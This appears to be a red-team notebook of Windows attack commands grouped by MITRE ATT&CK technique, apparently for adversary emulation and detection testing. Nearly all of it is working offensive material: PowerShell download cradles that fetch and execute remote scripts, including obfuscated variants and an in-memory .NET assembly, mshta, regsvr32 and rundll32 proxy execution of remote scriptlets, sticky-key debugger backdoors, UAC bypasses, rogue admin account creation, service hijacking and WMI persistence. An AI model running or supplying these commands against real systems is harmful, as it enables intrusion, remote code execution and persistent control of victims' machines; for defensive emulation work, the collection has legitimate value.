Execution
1.  T1191 CMSTP
cmstp.exe /s C:\tests\T1191\T1191.inf
 
2.  T1223 Compiled HTML File
hh.exe C:\tests\T1223\T1223.chm

3.  T1196 Control Panel Items
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v cmd.cpl /t REG_SZ /d "C:\tests\T1196\cmd.cpl"

4.  T1118 InstallUtil
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library C:\tests\T1118\T1118.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConwsole=false /U .\T1118.dll
   
5.  T1170 Mshta - defender
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();

6.  T1086 PowerShell
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All

"Powershell WebClient DownloadString" - Defender
$Command = "IEX (New-Object Net.WebClient).DownloadString(`'" + $Url[0] + "`')"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WebClient DownloadData"
$Command = "[System.Text.Encoding]::ASCII.GetString((New-Object Net.WebClient).DownloadData(`'" + $Url[0] + "`')) | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WebClient OpenRead"
$Command = "`$sr=New-Object System.IO.StreamReader((New-Object Net.WebClient).OpenRead(`'" + $Url[0] + "`'));`$res=`$sr.ReadToEnd();`$sr.Close();`$res | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WebClient DownloadFile"
$Command = "(New-Object Net.WebClient).DownloadFile(`'" + $Url[0] + "`'," + "`'" + $Outfile + "`'); GC `'" + $OutFile + "`' | IEX" 
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Invoke-WebRequest"
$Command = "(`'" + $Url[0] + "`'|ForEach-Object{(IWR -UseBasicParsing (Item Variable:\_).Value)}) | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Invoke-RestMethod"
$Command = "(`'" + $Url[0] + "`'|ForEach{(IRM (Variable _).Value)}) | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Excel COM object"
$Command = "`$comExcel=New-Object -ComObject Excel.Application;While(`$comExcel.Busy){Start-Sleep -Seconds 1}`$comExcel.DisplayAlerts=`$False;`$Null=`$comExcel.Workbooks.Open(`'" + $Url[0] + "`');While(`$comExcel.Busy){Start-Sleep -Seconds 1}IEX((`$comExcel.Sheets.Item(1).Range('A1:R'+`$comExcel.Sheets.Item(1).UsedRange.Rows.Count).Value2|?{`$_})-Join'`n');`$comExcel.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject(`$comExcel)"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Word COM object"
$Command = "`$comWord=New-Object -ComObject Word.Application;While(`$comWord.Busy){Start-Sleep -Seconds 1}`$comWord.Visible=`$False;`$doc=`$comWord.Documents.Open(`'" + $Url[0] + "`');While(`$comWord.Busy){Start-Sleep -Seconds 1}IEX(`$doc.Content.Text);`$comWord.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject(`$comWord)"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Internet Explorer COM object"
$Command = "`$comIE=New-Object -ComObject InternetExplorer.Application;While(`$comIE.Busy){Start-Sleep -Seconds 1}`$comIE.Visible=`$False;`$comIE.Silent=`$True;`$comIE.Navigate(`'" + $Url[0] + "`');While(`$comIE.Busy){Start-Sleep -Seconds 1}IEX(`$comIE.Document.Body.InnerText);`$comIE.Quit();[Void][System.Runtime.InteropServices.Marshal]::ReleaseComObject(`$comIE)"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell MsXml COM object" # Not proxy aware removing cache although does not appear to write to those locations
$Command = "`$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;`$comMsXml.Open('GET',`'" + $Url[0] + "`',`$False);`$comMsXml.Send();IEX `$comMsXml.ResponseText"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell WinHttp COM object" # Not proxy aware removing cache although does not appear to write to those locations
$Command = "`$comWinHttp=new-object -com WinHttp.WinHttpRequest.5.1;`$comWinHttp.open('GET',`'" + $Url[0] + "`',`$false);`$comWinHttp.send();IEX `$comWinHttp.responseText"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell  HttpWebRequest" # Not proxy aware
Try{(New-Object System.Net.HttpWebRequest).Credentials=[System.Net.HttpWebRequest]::DefaultNetworkCredentials}
Catch{}
$Command = "`$sr=New-Object IO.StreamReader([System.Net.HttpWebRequest]::Create(`'" + $Url[0] + "`').GetResponse().GetResponseStream());`$res=`$sr.ReadToEnd();`$sr.Close();IEX `$res"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell XML requests"
$Command = "`$Xml = (New-Object System.Xml.XmlDocument);`$Xml.Load(`'" + $Url[2] + "`');`$Xml.command.a.execute | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Inline C#"
$Command="Add-Type 'using System.Net;public class Class{public static string Method(string url){return (new WebClient()).DownloadString(url);}}';IEX ([Class]::Method(`'" + $Url[0] + "`'))"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell Compiled C#"
$Command="[Void][System.Reflection.Assembly]::Load([Byte[]](@(77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184)+@(0)*7+@(64)+@(0)*35+@(128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111,116,32,98,101,32,114,117,110,32,105,110,32,68,79,83,32,109,111,100,101,46,13,13,10,36)+@(0)*7+@(80,69,0,0,76,1,3,0,6,190,153,90)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,110,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(32,35,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,116,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(80,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,168,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,204,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,68,2,0,0,8,0,0,0,35,85,83,0,76,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,92,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,95,0,63,0,6,0,127,0,63,0,10,0,179,0,168,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,57,0,15,0,2,0,0,0,1,0,164,0,17,0,57,0,19,0,25,0,57,0,15,0,33,0,57,0,15,0,33,0,189,0,24,0,9,0,57,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(157,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,108,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,77,101,116,104,111,100,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,3,32,0,0,0,0,0,221,77,161,112,179,108,67,66,138,95,4,222,69,250,124,72,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*155+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502));([Class]::Method(`'" + $Url[0] + "`')) | IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command


"Powershell BITS transfer"
$Command = "Start-BitsTransfer `'" + $Url[0] + "`' `'" + $Outfile + "`'; GC `'" + $OutFile + "`'|IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command

"DNS txt record nslookup"
$Command = "`$b64=(IEX(nslookup -q=txt " + $url[1] + " 2>`$null)[-1]);[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$b64))| IEX"
Invoke-DownloadCradle -Type Powershell -Command $Command

Obfuscation Tests - Defender
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
 
9.  T1121 Regsvcs/Regasm
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library C:\tests\T1121\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U .\T1121.dll

10. T1117 Regsvr32
regsvr32.exe /s /u /i:C:\tests\T1117\RegSvr32.sct scrobj.dll
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll - defender

11. T1053 Scheduled Task
SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 04:33

12. T1035 Service Execution - Admin
sc.exe create ARTService binPath= "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"
sc.exe start ARTService
sc.exe delete ARTService

13. T1085 Rundll32 - Windows Defender
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"

14. T1218 Signed Binary Proxy Execution
msiexec /y C:\tests\T1218\T1218.dll
mavinject.exe 1000 /INJECTRUNNING C:\tests\T1218\T1218.dll
odbcconf.exe /S /A {REGSVR "C:\tests\T1218\T1218.dll"}

15. T1216 Signed Script Proxy Execution - Windows Defender

16. T1127 Trusted Developer Utilities
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\tests\T1127\T1127.csproj

17. T1028 Windows Remote Management
wmic /node:localhost process call create "C:\Windows\system32\cmd.exe"
psexec \\localhost -u USERNAMR -p PASSWORD -h notepad.exe - Admin


Persistence
1.  T1015 Accessibility Feature - Admin - Defender
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

2.  T1098 Account Manipulation - Admin
$Password = Read-Host -AsSecureString
New-LocalUser "NEW_ACCOUNT_NAME" -Password $Password -FullName "USER_FULL_NAME" -Description "Description of this account."
Add-LocalGroupMember -Group "Administrators" -Member "NEW_ACCOUNT_NAME"

3.  T1182 AppCert DLLs - Admin - not working
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "Debugger" /t REG_SZ /d "C:\tests\T1182\T1182.dll" /f

4.  T1103 AppInit DLLs - Admin
reg.exe import C:\tests\T1103\T1103.reg
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows

5.  T1138 Application Shimming - Admin
mkdir C:\Tools
copy AtomicTest.Dll C:\Tools\AtomicTest.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 AtomicTest.cs
From Elevated Prompt
sdbinst.exe AtomicShimx86.sdb
AtomicTest.exe
sdbinst -u AtomicShimx86.sdb

6.  T1131 Authentication Package - Admin - TODO

7.  T1197 BITS Jobs - Admin
bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\output
 
8.  T1042 Change Default File Association - Admin
cmd.exe /c assoc .wav="C:\Program Files\Windows Media Player\wmplayer.exe"

9.  T1122 Component Object Model Hijacking - Admin - TODO
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mscfile\shell\open\command" /v "(Default)" /t REG_EXPAND_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f
%SystemRoot%\system32\mmc.exe "%1" %*

10. T1136 Create Account - Admin
net user /add test
New-LocalUser -Name test_psh -NoPassword
 
11. T1158 Hidden Files and Directories - no Mitigation
attrib.exe +s system.file
attrib.exe +h hidden.file

echo "test" > test.txt:ads.txt
echo "test" > :ads.txt
dir /s /r | find ":$DATA"

echo "test" > test.txt | set-content -path test.txt -stream ads.txt -value "test"
set-content -path test.txt -stream ads.txt -value "test2"
ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
 
12. T1179 Hooking - Admin
mavinject $pid /INJECTRUNNING C:\tests\T1179\T1179x64.dll
curl https://www.example.com

13. T1183 Image File Execution Options Injection - Admin - Cleanup
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "cmd.exe"

14. T1037 Logon Scripts - Admin
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "cmd.exe /c calc.exe"

15. T1031 Modify Existing Service - Admin
$service = get-wmiobject -query 'select * from win32_service where name="Spooler"'; echo $service.pathname
sc stop Spooler
sc config Spooler binPath= "net user eviladmin P4ssw0rd@ /add"
sc start Spooler

16. T1128 Netsh Helper DLL - Admin
netsh.exe add helper C:\tests\T1128\T1128.dll
netsh.exe delete helper C:\tests\T1128\T1128.dll

17. T1050 New Service - Admin 
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\tests\T1050\AtomicService.cs
sc create AtomicService binPath= "C:\tests\T10150\AtomicService.exe"
sc start AtomicService
sc query AtomicService
sc stop AtomicSerivce
sc delete AtomicSerivce

18. T1137 Office Application Startup - Admin

19. T1013 Port Monitors - Admin

20. T1060 Registry Run Keys / Startup Folder - Admin
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe"
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f

REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\tests\T1060\MessageBox32.dll"
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f

$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'C:\Windows\System32\calc.exe'
Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force

$TargetFile = "$env:SystemRoot\System32\calc.exe"
$ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()

21. T1198 SIP & Trust Provider Hijacking - Admin

22. T1053 Scheduled Task
C:\Windows\system32>SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 04:33

23. T1180 Screensaver
copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
shutdown /r /t 0

24. T1101 Security Support Provider - Admin

25. T1023 Shortcut Modification
Copy-Item .\Desktop.lnk .\Test.lnk
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut(".\Test.lnk")
$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$shortcut.Save()

26. T1209 Time Providers - Admin

27. T1084 Windows Management Instrumentation Event Subscription - Admin - TODO
After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.

$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
                CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

CLEANUP
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject

28. T1004 Winlogon Helper DLL - Admin
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force

Privilege Escalation
1.  T1134 Access Token Manipulation - Admin
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134/src/T1134.ps1'); [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")

2.  T1015 Accessibility Features - Admin, Defender
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

3.  T1182 AppCert DLLs - Admin - not working
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "Debugger" /t REG_SZ /d "C:\tests\T1182\T1182.dll" /f

4.  T1103 AppInit DLLs - Admin
reg.exe import C:\tests\T1103\T1103.reg
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows

5.  T1138 Application Shimming - Admin
mkdir C:\Tools
copy AtomicTest.Dll C:\Tools\AtomicTest.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /platform:x86 AtomicTest.cs
From Elevated Prompt
sdbinst.exe AtomicShimx86.sdb
AtomicTest.exe
sdbinst -u AtomicShimx86.sdb

6.  T1088 Bypass User Account Control - Admin
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
fodhelper.exe

reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
cmd.exe /c eventvwr.msc

7.  T1179 Hooking - Admin
mavinject $pid /INJECTRUNNING C:\tests\T1179\T1179x64.dll
curl https://www.example.com

8.  T1183 Image File Execution Options Injection - Admin - Cleanup
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "cmd.exe"

9.  T1050 New Service - Admin
c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\tests\T1050\AtomicService.cs
sc create AtomicService binPath= "C:\tests\T10150\AtomicService.exe"
sc start AtomicService
sc query AtomicService
sc stop AtomicSerivce
sc delete AtomicSerivce

10. T1055 Process Injection
mavinject.exe 1000 /INJECTRUNNING C:\tests\T1055\T1055.dll

11. T1178 SID-History Injection - DA


Defense Evasion

1.  T1134 Access Token Manipulation - Admin
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134/src/T1134.ps1'); [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")

2.  T1197 BITS Jobs
